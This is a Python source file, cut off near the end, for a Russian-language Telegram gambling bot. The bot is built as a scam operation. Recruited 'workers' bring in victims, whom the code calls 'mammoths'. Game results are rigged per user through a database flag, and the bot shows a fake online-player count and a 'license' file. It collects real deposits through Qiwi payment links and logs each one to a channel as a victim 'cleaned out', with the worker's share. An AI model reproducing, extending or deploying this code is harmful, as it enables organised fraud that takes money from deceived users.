import asyncio
import sqlite3
import json
import random
import requests
from environs import Env
from pyqiwip2p import QiwiP2P
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, message
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import CallbackQuery, Message
from aiogram.utils.callback_data import CallbackData
import scenes
import functions
from datetime import datetime

env = Env()
env.read_env()

NAME_TEAM = env.str('NAME_TEAM')
NAME_CASINO = env.str('NAME_CASINO')
TOKEN_CASINO = env.str('TOKEN_CASINO')
TOKEN_WORKER = env.str('TOKEN_WORKER')

PATHS = env.str('PATHS')
BD_PATH = env.str('BD_PATH')

LOGS_CHANNEL_ID = env.str('LOGS_CHANNEL_ID')
LOGS_CHAT_ID = env.str('LOGS_CHAT_ID')
USERNAME_CASINO_BOT = env.str('USERNAME_CASINO_BOT')

bot = Bot(TOKEN_CASINO, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
worker_bot = Bot(TOKEN_WORKER, parse_mode=types.ParseMode.HTML, disable_web_page_preview=True)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class enterCode(StatesGroup):
    ref_code = State()

class Deposit(StatesGroup):
    enter_amount = State()

class Withdraw(StatesGroup):
    q1 = State()

class RandomNumber(StatesGroup):
    q1 = State()

class Coin(StatesGroup):
    q1 = State()

class Dice(StatesGroup):
    q1 = State()

print(f"{NAME_TEAM} | Casino: Казино бот был запущен!")

@dp.message_handler(chat_type='private', commands="start", state="*")
async def start(message: types.Message, state: FSMContext):
    try:
        referal_code = message.get_args()
        with sqlite3.connect(BD_PATH) as cursor:
            user = cursor.execute("SELECT * FROM users_casino WHERE id = ?", (message.from_user.id,)).fetchone()
        if user is None:
            with sqlite3.connect(BD_PATH) as cursor:
                worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (referal_code,)).fetchone()
            if worker is None:
                await message.answer(f"Для начала работы, напишите код-приглашение пригласившего Вас человека")
                await enterCode.ref_code.set()
            else:
                await message.answer(f"Воспользуйтесь меню для управления ботом", reply_markup=scenes.main)
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute('INSERT INTO users_casino VALUES (?, ?, ?, ?, ?, ?)', (message.from_user.id, referal_code, 0, message.from_user.first_name, 1, 0))
                await worker_bot.send_message(worker[0], f"@{message.from_user.username} - твой новый мамонт🦣")
        else:
            if user[5] == 1:
                return
            await message.answer(f"Воспользуйтесь меню для управления ботом", reply_markup=scenes.main)
    except Exception as e:
        print(e)
        print(f"{NAME_TEAM} | Casino: У Казино бота возникла ошибка во время выполнения хендлера! Известные данные:")
        print(f"{NAME_TEAM} | Casino: {message.from_user.username} | {message.from_user.id} - {message.text}")

@dp.message_handler(state=enterCode.ref_code)
async def answer_code(message: types.Message, state: FSMContext):
    await state.update_data(code=message.text)
    data = await state.get_data()
    with sqlite3.connect(BD_PATH) as cursor:
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (data.get('code'),)).fetchone()
    if worker is None:
        await message.answer("⚠️ Напишите правильный код-приглашение пригласившего Вас человека")
    else:
        await message.answer(f"Воспользуйтесь меню для управления ботом", reply_markup=scenes.main)
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute('INSERT INTO users_casino VALUES (?, ?, ?, ?, ?, ?)', (message.from_user.id, data.get('code'), 0, message.from_user.first_name, 1, 0))
        await worker_bot.send_message(worker[0], f"@{message.from_user.username} - твой новый мамонт🦣")
        await state.finish()

@dp.message_handler(chat_type='private', content_types=['text'], text='🙎‍♂ Мой профиль')
async def profile(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        profile = cursor.execute(f'SELECT * FROM users_casino WHERE id = {message.from_user.id}').fetchone()
    if profile[5] == 1:
        return
    profile_menu = InlineKeyboardMarkup(
        inline_keyboard = [
            [
                InlineKeyboardButton(text='📥 Пополнить', callback_data='deposit'),
                InlineKeyboardButton(text='📤 Вывести', callback_data='withdraw')
            ],
            [
                InlineKeyboardButton(text='⤴️ Реферальная ссылка', url=f'https://t.me/share/url?url=https://t.me/{USERNAME_CASINO_BOT}?start={profile[1]}&text=Играй вместе с 💎{NAME_CASINO}💎 и зарабатывай!')
            ]
        ]
    )
    await message.answer(f"📲 ЛИЧНЫЙ КАБИНЕТ \n\n"
                         f"💸 Баланс: {profile[2]} ₽ \n\n"
                         f"🆔 Ваш игровой ID: <b>{message.from_user.id}</b> \n\n"
                         f"🎲 Число человек онлайн {random.randint(6500, 9000)} 🎲", reply_markup=profile_menu)

@dp.message_handler(chat_type='private', content_types=['text'], text='ℹ️ Информация')
async def information(message: types.Message):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    await message.answer(f"Выберите что вас интересует.", reply_markup=scenes.information)

@dp.message_handler(chat_type='private', content_types=['text'], text='🎰 Играть')
async def games(message: types.Message):
    await message.answer(f"💁🏻‍♀ Выберите игру", reply_markup=scenes.games)

@dp.callback_query_handler(text='random_number')
async def randomNumberGame(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {call.from_user.id}').fetchone()
    if user[2] < 10:
        await call.message.answer('❌ На балансе недостаточно средств ❌\n\nМинимальная сумма ставки - 10 ₽')
    else:
        await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2]}', reply_markup=scenes.cancel)
        await RandomNumber.q1.set()

@dp.message_handler(state=RandomNumber.q1)
async def random_number_sum(message: types.Message, state: FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {message.from_user.id}').fetchone()
    try:
        if user[2] < int(message.text) or int(message.text) < 10:
            await message.answer(f'Сумма ставки введена некорректно.\n\nМинимальная сумма ставки - 10 ₽ \nМаксимальная сумма ставки - {user[2]}')
        else:
            await message.answer('💁🏻‍♀ Ставка засчитана, выпало число, выберите его интервал', reply_markup=scenes.interval(message.text))
            await state.finish()
    except ValueError:
        await message.answer("Главное меню", reply_markup=scenes.main)
        await state.finish()

@dp.callback_query_handler(text_startswith="RandomNumberr")
async def process_callback_button1(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    amount,vibor = call.data.split(",")[1],call.data.split(",")[2]
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {call.from_user.id}').fetchone()
    if vibor == 'biggest':
        if user[4] == 2:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпавшее число {random.randint(51, 100)}")
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount)}', reply_markup=scenes.cancel)
            await RandomNumber.q1.set()
        elif user[4] == 1:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпавшее число {random.randint(51, 100)}")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount)}', reply_markup=scenes.cancel)
                await RandomNumber.q1.set()
            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
                if user[2] <= 10:
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                    await RandomNumber.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
            with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
            if user[2] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                await RandomNumber.q1.set()
    elif vibor == 'equals':
        if user[4] == 2:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {int(amount) * 10}\nВыпавшее число 50")
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_casino SET balance = balance + ? * 10 WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount) * 10}', reply_markup=scenes.cancel)
            await RandomNumber.q1.set()
        elif user[4] == 1:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {int(amount) * 10}\nВыпавшее число 50")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance + ? * 10 WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount) * 10}', reply_markup=scenes.cancel)
                await RandomNumber.q1.set()
            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(1, 100)}")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
                if user[2] <= 10:
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                    await RandomNumber.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
            with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
            if user[2] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                await RandomNumber.q1.set()
    else:
        if user[4] == 2:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount)}', reply_markup=scenes.cancel)
            await RandomNumber.q1.set()
        elif user[4] == 1:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпавшее число {random.randint(1, 49)}")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount)}', reply_markup=scenes.cancel)
                await RandomNumber.q1.set()
            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(51, 100)}")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
                if user[2] <= 10:
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                    await RandomNumber.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпавшее число {random.randint(51, 100)}")
            with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
            if user[2] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                await RandomNumber.q1.set()

@dp.callback_query_handler(text="orel_reshka")
async def heads_or_tails_btn(call: types.CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {call.from_user.id}').fetchone()
    if user[2] < 10:
        await call.message.answer("❌ На балансе недостаточно средств ❌\n\nМинимальная сумма ставки - 10 ₽")
    else:
        await call.message.answer(f"💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2]}", reply_markup=scenes.cancel)
        await Coin.q1.set()

@dp.message_handler(state=Coin.q1)
async def heads_or_tails_sum(message: types.Message, state: FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {message.from_user.id}').fetchone()
    try:
        if int(message.text) < 10 or int(message.text) > user[2]:
            await message.answer(f"Сумма ставки введена некорректно.\nМинимальная сумма ставки - 10 ₽\nМаксимальная сумма ставки - {user[2]} ₽")
        else:
            await message.answer("💁🏻‍♀ Ставка засчитана, выберите на кого поставите",reply_markup=scenes.coin(message.text))
            await state.finish()
    except ValueError:
        await message.answer("Вы ввели не число!\nВыберите игру заново или вернитесь назад")
        await state.finish()

@dp.callback_query_handler(text_startswith="Coinflip")
async def heads_btn(call: types.CallbackQuery):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    amount,vibor = call.data.split(",")[1],call.data.split(",")[2]
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {call.from_user.id}').fetchone()
    if vibor == 'Orel':
        if user[4] == 2:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпал орел!")
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount)}', reply_markup=scenes.cancel)
            await Coin.q1.set()
        elif user[4] == 1:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпал орел")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount)}', reply_markup=scenes.cancel)
                await Coin.q1.set()

            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпала решка")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
                if user[2] <= 10:                 
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                    await Coin.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпала решка")
            with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
            if user[2] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                await Coin.q1.set()
    else:
        if user[4] == 2:
            await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпала решка!")
            with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
            await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount)}', reply_markup=scenes.cancel)
            await Coin.q1.set()
        elif user[4] == 1:
            result = random.randint(1, 2)
            if result == 1:
                await call.message.answer(f"❤ Ваша ставка выиграла - выигрыш {amount}\nВыпала решка!")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(amount, call.from_user.id,))
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(amount)}', reply_markup=scenes.cancel)
                await Coin.q1.set()
            else:
                await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпал орел!")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
                if user[2] <= 10:
                    await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
                else:
                    await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                    await Coin.q1.set()
        else:
            await call.message.answer(f"💔 Ваша ставка проиграла - проигрыш {amount}\nВыпал орел")
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(amount, call.from_user.id,))
            if user[2] <= 10:
                await call.message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
            else:
                await call.message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(amount)}', reply_markup=scenes.cancel)
                await Coin.q1.set()

@dp.callback_query_handler(text="random_dice")
async def random_dice_btn(call: types.CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {call.from_user.id}').fetchone()
    if user[2] < 10:
        await call.message.answer("❌ На балансе недостаточно средств ❌\n\nМинимальная сумма ставки - 10 ₽")
    else:
        await call.message.answer(f"💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2]}", reply_markup=scenes.cancel)
    await Dice.q1.set()

@dp.message_handler(state=Dice.q1)
async def random_dice_sum(message: types.Message, state: FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {message.from_user.id}').fetchone()
    try:
        if int(message.text) < 10 or int(message.text) > user[2]:
            await message.answer(f"Сумма ставки введена некорректно.\nМинимальная сумма ставки - 10 ₽\nМаксимальная сумма ставки - {user[2]} ₽")
        else:
            await message.answer("💁🏻‍♀ Ставка засчитана")
            one_point = "CAACAgIAAxkBAAEOWYJhkPT2ojKkslnxy1rH-8xS3rcPuAAC3MYBAAFji0YMsbUSFEouGv8iBA"
            two_point = "CAACAgIAAxkBAAEOKxRhiFE5JfReRO6gZlItEuZKcTw4FwAC3cYBAAFji0YM608pO-wjAlEiBA"
            three_point = "CAACAgIAAxkBAAEOY6BhkpmmVkdpWR2bP0bFelAmIQ5yOQAC3sYBAAFji0YMVHH9hav7ILkiBA"
            four_point = "CAACAgIAAxkBAAEOY6Jhkpm-7_ZhXS5rPlNH9N9AfTIzbgAC38YBAAFji0YMHEUTINW7YxciBA"
            five_point = "CAACAgIAAxkBAAEOY6RhkpnUEJFca6ISof5GiwtYh_O-JwAC4MYBAAFji0YMSLHz-sj_JqkiBA"
            six_point = "CAACAgIAAxkBAAEOY6Zhkpnut8ZgPcI3nPC3auNQZVYWOAAC4cYBAAFji0YM75p8zae_tHoiBA"
            if user[4] == 2:
                await bot.send_sticker(message.from_user.id, random.choice([four_point, five_point, six_point]))
                await message.answer("➖➖➖➖➖➖➖➖ \n"
                                     "  👆 Ваш кубик \n"
                                     "➖➖➖➖➖➖➖➖ \n"
                                     "  👇 Кубик бота \n"
                                     "➖➖➖➖➖➖➖➖")
                await bot.send_sticker(message.from_user.id, random.choice([one_point, two_point, three_point]))
                await message.answer(f"❤ Ваша ставка выиграла - выигрыш {int(message.text)} \n")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(message.text, message.from_user.id,))
                await message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(message.text)}', reply_markup=scenes.cancel)
                await Dice.q1.set()
            elif user[4] == 1:
                result = random.randint(1,2)
                if result == 1:
                    await bot.send_sticker(message.from_user.id, random.choice([four_point, five_point, six_point]))
                    await message.answer("➖➖➖➖➖➖➖➖ \n"
                                         "  👆 Ваш кубик \n"
                                         "➖➖➖➖➖➖➖➖ \n"
                                         "  👇 Кубик бота \n"
                                         "➖➖➖➖➖➖➖➖")
                    await bot.send_sticker(message.from_user.id, random.choice([one_point, two_point, three_point]))
                    await message.answer(f"❤ Ваша ставка выиграла - выигрыш {int(message.text)} \n")
                    with sqlite3.connect(BD_PATH) as cursor:
                        cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?",(message.text, message.from_user.id,))
                    await message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] + int(message.text)}', reply_markup=scenes.cancel)
                    await Dice.q1.set()
                else:
                    await bot.send_sticker(message.from_user.id, random.choice([one_point, two_point, three_point]))
                    await message.answer("➖➖➖➖➖➖➖➖ \n"
                                         "  👆 Ваш кубик \n"
                                         "➖➖➖➖➖➖➖➖ \n"
                                         "  👇 Кубик бота \n"
                                         "➖➖➖➖➖➖➖➖")
                    await bot.send_sticker(message.from_user.id, random.choice([four_point, five_point, six_point]))
                    await message.answer(f"💔 Ваша ставка проиграла - проигрыш {int(message.text)} \n")
                    with sqlite3.connect(BD_PATH) as cursor:
                        cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(message.text, message.from_user.id,))
                    if user[2] <= 10:
                        await message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
                        await state.finish()
                    else:
                        await message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(message.text)}', reply_markup=scenes.cancel)
                        await Dice.q1.set()
            else:
                await bot.send_sticker(message.from_user.id, random.choice([one_point, two_point, three_point]))
                await message.answer("➖➖➖➖➖➖➖➖ \n"
                                     "  👆 Ваш кубик \n"
                                     "➖➖➖➖➖➖➖➖ \n"
                                     "  👇 Кубик бота \n"
                                     "➖➖➖➖➖➖➖➖")
                await bot.send_sticker(message.from_user.id, random.choice([four_point, five_point, six_point]))
                await message.answer(f"💔 Ваша ставка проиграла - проигрыш {int(message.text)} \n")
                with sqlite3.connect(BD_PATH) as cursor:
                    cursor.execute("UPDATE users_casino SET balance = balance - ? WHERE id = ?",(message.text, message.from_user.id,))
                if user[2] <= 10:
                    await message.answer("❌❌ На балансе недостаточно средств ❌❌", reply_markup=scenes.main)
                    await state.finish()
                else:
                    await message.answer(f'💁🏻‍♀ Введите сумму ставки\nДоступно: {user[2] - int(message.text)}', reply_markup=scenes.cancel)
                    await Dice.q1.set()
    except ValueError:
        await message.answer("Вы ввели не число!\nВыберите игру заново или вернитесь назад")
        await state.finish()

@dp.callback_query_handler(text='deposit')
async def deposit(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT worker,ban FROM users_casino WHERE id = ?", (call.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT id,min_deposit_casino FROM worker WHERE referal_code = ?", (user[0],)).fetchone()
    if user[1] == 1:
        return
    await call.message.answer(f"Введите сумму пополнения \n"
                              f"<b>Сумма минимального платежа - {worker[1]} ₽</b>")
    await Deposit.enter_amount.set()

@dp.message_handler(state=Deposit.enter_amount)
async def answer_pay(message: types.Message, state: FSMContext):
    await state.update_data(amount=message.text)
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {message.from_user.id}').fetchone()
    if user[5] == 1:
        return
    selectPay = InlineKeyboardMarkup(
	    inline_keyboard = [
            [
                InlineKeyboardButton(text = '💵 Оплатить Qiwi/Картой', callback_data = 'selectPay_qiwi,'+message.text)
		    ]
	    ]
    )
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT worker FROM users_casino WHERE id = ?", (message.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT id,min_deposit_casino FROM worker WHERE referal_code = ?", (user[0],)).fetchone()
    if message.text.isnumeric():
        if int(message.text) < worker[1]:
            await message.answer("Неккоректно введена сумма!")
        else:
            await message.answer("Выберите метод оплаты", reply_markup=selectPay)
    await state.finish()
                                
@dp.callback_query_handler(text_startswith='selectPay_qiwi')
async def selectPay_qiwi(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    amount = call.data.split(",")[1]
    comment = random.randint(100000, 999999)
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT worker FROM users_casino WHERE id = ?", (call.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT id,min_deposit_casino FROM worker WHERE referal_code = ?", (user[0],)).fetchone()
        qiwi = cursor.execute("SELECT * FROM qiwi WHERE bot = 'casino'",).fetchone()
        cursor.execute("INSERT INTO qiwi_pays VALUES (?, ?, ?, ?)", (call.from_user.id, USERNAME_CASINO_BOT, comment, '0',))

    p2p = QiwiP2P(auth_key=qiwi[1])
    bill = p2p.bill(bill_id=comment, amount=amount, lifetime=45, comment=comment)
    
    accept_kb = types.InlineKeyboardMarkup()
    accept_kb.add(types.InlineKeyboardButton(text = '✅ Оплатить', callback_data=f"casino_accept,{comment},{call.from_user.id},{amount}"))

    await worker_bot.send_message(worker[0], f"✅ <b>Новая заявка на пополнение!</b> \n"
                                             f"(Казино) \n\n"
                                             f"🐘 Мамонт: {call.from_user.full_name} [@{call.from_user.username}] \n"
                                             f"💸 Сумма: {amount} ₽", reply_markup=accept_kb)

    pay_kb = types.InlineKeyboardMarkup()
    pay_kb.add(types.InlineKeyboardButton(text = 'Оплатить', url=bill.pay_url))
    pay_kb.add(types.InlineKeyboardButton(text = 'Проверить оплату', callback_data=f"check,{comment},{amount}"))
    
    await call.message.answer(f"<b>Создана заявка на пополнение {amount} ₽</b>", reply_markup=pay_kb)

@dp.callback_query_handler(text='license')
async def licnese(call: CallbackQuery):
    await call.message.reply_document(open(f'{PATHS}/Casino/license_fc3db67fcd.pdf', 'rb'))

@dp.callback_query_handler(text_startswith='check')
async def checkPay_qiwi(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    comment, price = call.data.split(",")[1], call.data.split(",")[2]
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute("SELECT * FROM users_casino WHERE id = ?", (call.from_user.id,)).fetchone()
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?", (user[1],)).fetchone()
        pays = cursor.execute("SELECT * FROM qiwi_pays WHERE comment = ?", (comment,)).fetchone()
        share_check = cursor.execute("SELECT * FROM qiwi_pays WHERE id = ? AND bot_username = ? AND status = 1", (call.from_user.id,USERNAME_CASINO_BOT,)).fetchone()
        qiwi = cursor.execute("SELECT p2p_secret_key FROM qiwi WHERE bot = 'casino'",).fetchone()
    share = (float(await functions.worker_sharee(share_check)) * int(price))
    check = await functions.pays(qiwi[0], comment)
    if pays[3] == 1:
        with sqlite3.connect(BD_PATH) as cursor:
            cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?", (pays[2], call.from_user.id,))
        await call.message.edit_text(f'✅ Оплата прошла успешно.')
    else:
        if check:
            current_time = datetime.now()
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE worker SET profits = profits + ? WHERE referal_code = ?", (price, user[1],))
                cursor.execute("UPDATE information SET profits = profits + 1, amount_profits = amount_profits + ? WHERE id = 1", (price,))
                cursor.execute("UPDATE users_casino SET balance = balance + ? WHERE id = ?", (price, call.from_user.id,))
                cursor.execute("UPDATE qiwi_pays SET status = ? WHERE comment = ?", ('1', comment,))
                cursor.execute('INSERT INTO profits VALUES (?, ?, ?, ?)', (call.from_user.id, worker[0], price, current_time.strftime("%Y-%m-%d")))

            if (worker[10] != 1):
                username = worker[1]
            else:
                username = 'Аноним'

            await worker_bot.send_message(LOGS_CHANNEL_ID, f"☠️ <b>Новый профит!</b>  🎰 CASINO \n\n"
                                                        f"🏴‍☠️ Обчистил мамонта: <b>{username}</b> \n"
                                                        f"💸 Сумма пополнения: <b>{price}₽</b> \n"
                                                        f"└ Доля воркера: <b>{share}₽</b>")
            await worker_bot.send_sticker(worker[0], "CAACAgIAAxkBAAEGWd9jaiqWrvCr0fgS6PJI_Y3_CS--3QACZAADDbbSGRbBZmuQEnSJKwQ")
            await worker_bot.send_sticker(LOGS_CHAT_ID, "CAACAgIAAxkBAAEGWd9jaiqWrvCr0fgS6PJI_Y3_CS--3QACZAADDbbSGRbBZmuQEnSJKwQ")
            await worker_bot.send_message(LOGS_CHAT_ID, f"☠️ <b>Новый профит!</b>  🎰 CASINO \n\n"
